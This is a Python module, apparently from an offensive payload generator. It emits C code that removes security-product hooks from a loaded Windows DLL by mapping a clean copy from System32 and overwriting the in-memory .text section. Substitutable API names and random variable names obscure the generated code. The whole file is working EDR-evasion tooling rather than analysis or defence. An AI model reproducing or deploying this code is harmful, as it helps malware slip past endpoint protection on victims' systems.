from modules.namegen import generate_random_name


def generate_unhooking_code(dll_name, function_name, create_file, create_section, map_view, virtual_protect, write_vm, unmap_view, close_handle):

    unhook_template = """
void REPLACE_W_FUNCTION_NAME() {
    
    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("Ntdll.dll"), "RtlInitUnicodeString");
    if (RtlInitUnicodeString == NULL) {
        exit(0);
    }
    
    LPCWSTR REPLACE_W_VAR1 = L"\\\\??\\\\C:\\\\Windows\\\\System32\\\\DLL_NAME_HERE";
    UNICODE_STRING REPLACE_W_VAR2;
    OBJECT_ATTRIBUTES REPLACE_W_VAR3 = {};
    _IO_STATUS_BLOCK REPLACE_W_VAR4 = {};
    HANDLE REPLACE_W_VAR5 = NULL;
    HANDLE REPLACE_W_VAR6 = NULL;
    LPVOID REPLACE_W_VAR7 = NULL;
    LPVOID REPLACE_W_VAR8 = NULL;
    HMODULE REPLACE_W_VAR9 = NULL;
    MODULEINFO REPLACE_W_VAR10 = {};
    PIMAGE_DOS_HEADER REPLACE_W_VAR11 = 0;
    PIMAGE_NT_HEADERS REPLACE_W_VAR12 = 0;
    PIMAGE_SECTION_HEADER REPLACE_W_VAR13 = 0;
    LPSTR REPLACE_W_VAR14;
    ULONG REPLACE_W_VAR15;
    LPVOID REPLACE_W_VAR16 = NULL;
    LPVOID REPLACE_W_VAR17 = NULL;
    SIZE_T REPLACE_W_VAR18;
    SIZE_T REPLACE_W_VAR19 = 0;
    LPVOID REPLACE_W_VAR20;
    HANDLE REPLACE_W_VAR21 = GetCurrentProcess();
    SIZE_T REPLACE_W_VAR22;
    
    RtlInitUnicodeString(&REPLACE_W_VAR2, REPLACE_W_VAR1);
    REPLACE_W_VAR3.Length = sizeof(OBJECT_ATTRIBUTES);
    REPLACE_W_VAR3.ObjectName = &REPLACE_W_VAR2;
    
    REPLACE_WITH_CREATEFILE(&REPLACE_W_VAR5, FILE_READ_ATTRIBUTES | GENERIC_READ | SYNCHRONIZE, &REPLACE_W_VAR3, &REPLACE_W_VAR4, NULL, 0, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    REPLACE_WITH_CREATESECTION(&REPLACE_W_VAR6, STANDARD_RIGHTS_REQUIRED | SECTION_MAP_READ | SECTION_QUERY, NULL, NULL, PAGE_READONLY, SEC_IMAGE, REPLACE_W_VAR5);
    REPLACE_WITH_MAP_VIEW_OF_SECTION(REPLACE_W_VAR6, REPLACE_W_VAR21, &REPLACE_W_VAR7, 0, 0, 0, &REPLACE_W_VAR18, ViewShare, 0, PAGE_READONLY);

    REPLACE_W_VAR9 = GetModuleHandleA("DLL_NAME_HERE");
    
    if (GetModuleInformation(GetCurrentProcess(), REPLACE_W_VAR9, &REPLACE_W_VAR10, sizeof(REPLACE_W_VAR10)) == 0) {
        exit(0);
    }
    
    REPLACE_W_VAR8 = (LPVOID)REPLACE_W_VAR10.lpBaseOfDll;
    REPLACE_W_VAR11 = (PIMAGE_DOS_HEADER)REPLACE_W_VAR8;
    REPLACE_W_VAR12 = (PIMAGE_NT_HEADERS)((DWORD_PTR)REPLACE_W_VAR8 + REPLACE_W_VAR11->e_lfanew);
    for (SIZE_T i = 0; i < REPLACE_W_VAR12->FileHeader.NumberOfSections; i++) {
    
        REPLACE_W_VAR13 = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(REPLACE_W_VAR12) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
        REPLACE_W_VAR14 = (LPSTR)REPLACE_W_VAR13->Name;
        if (!strcmp(REPLACE_W_VAR14, ".text")) {
    
            REPLACE_W_VAR16 = (LPVOID)((DWORD_PTR)REPLACE_W_VAR8 + (DWORD_PTR)REPLACE_W_VAR13->VirtualAddress);
            REPLACE_W_VAR17 = (LPVOID)((DWORD_PTR)REPLACE_W_VAR7 + (DWORD_PTR)REPLACE_W_VAR13->VirtualAddress);
            REPLACE_W_VAR18 = REPLACE_W_VAR13->Misc.VirtualSize;
    
            REPLACE_W_VAR20 = REPLACE_W_VAR16;
    
            REPLACE_WITH_PROTECT_VM(REPLACE_W_VAR21, &REPLACE_W_VAR20, &REPLACE_W_VAR18, PAGE_EXECUTE_READWRITE, &REPLACE_W_VAR15);
            REPLACE_WITH_WRITE_VM(REPLACE_W_VAR21, REPLACE_W_VAR16, REPLACE_W_VAR17, REPLACE_W_VAR18, &REPLACE_W_VAR22);
            REPLACE_WITH_PROTECT_VM(REPLACE_W_VAR21, &REPLACE_W_VAR16, &REPLACE_W_VAR18, REPLACE_W_VAR15, nullptr);
    
        }
    }
    
    REPLACE_WITH_UNMAP_VIEW_OF_SECTION(REPLACE_W_VAR21, REPLACE_W_VAR7);
    REPLACE_WITH_CLOSE(REPLACE_W_VAR6);
    REPLACE_WITH_CLOSE(REPLACE_W_VAR5);
    FreeLibrary(REPLACE_W_VAR9);
    
}

"""

    unhook_template = unhook_template.replace("REPLACE_W_FUNCTION_NAME", function_name)
    unhook_template = unhook_template.replace("DLL_NAME_HERE", dll_name)
    unhook_template = unhook_template.replace("REPLACE_WITH_CREATEFILE", create_file)
    unhook_template = unhook_template.replace("REPLACE_WITH_CREATESECTION", create_section)
    unhook_template = unhook_template.replace("REPLACE_WITH_MAP_VIEW_OF_SECTION", map_view)
    unhook_template = unhook_template.replace("REPLACE_WITH_PROTECT_VM", virtual_protect)
    unhook_template = unhook_template.replace("REPLACE_WITH_WRITE_VM", write_vm)
    unhook_template = unhook_template.replace("REPLACE_WITH_UNMAP_VIEW_OF_SECTION", unmap_view)
    unhook_template = unhook_template.replace("REPLACE_WITH_CLOSE", close_handle)

    unhook_template = unhook_template.replace("REPLACE_W_VAR10", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR11", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR12", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR13", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR14", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR15", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR16", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR17", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR18", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR19", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR20", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR21", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR22", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR1", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR2", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR3", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR4", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR5", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR6", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR7", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR8", generate_random_name())
    unhook_template = unhook_template.replace("REPLACE_W_VAR9", generate_random_name())

    return unhook_template